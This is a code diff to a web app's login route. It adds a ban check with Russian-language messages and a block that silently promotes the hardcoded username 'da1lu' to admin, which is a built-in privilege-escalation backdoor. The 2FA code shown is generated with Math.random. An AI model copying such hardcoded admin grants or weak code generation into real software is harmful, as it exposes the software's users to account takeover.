@@ -91,6 +91,25 @@ router.post('/login', [
       return res.status(400).json({ message: 'Invalid credentials' });
     }
 
+    // Check if user is banned
+    if (user.isBanned) {
+      if (user.banExpires && user.banExpires < Date.now()) {
+        user.isBanned = false;
+        user.banExpires = undefined;
+        user.banReason = undefined;
+        await user.save();
+      } else {
+        const expiresMsg = user.banExpires ? ` до ${new Date(user.banExpires).toLocaleString()}` : ' навсегда';
+        return res.status(403).json({ message: `Ваш аккаунт заблокирован${expiresMsg}. Причина: ${user.banReason || 'Не указана'}` });
+      }
+    }
+
+    // Auto-promote da1lu to admin for initial setup
+    if (user.username === 'da1lu' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
+
     // Mandatory 2FA for all users
     const code = Math.floor(100000 + Math.random() * 900000).toString();
     user.verificationCode = code;
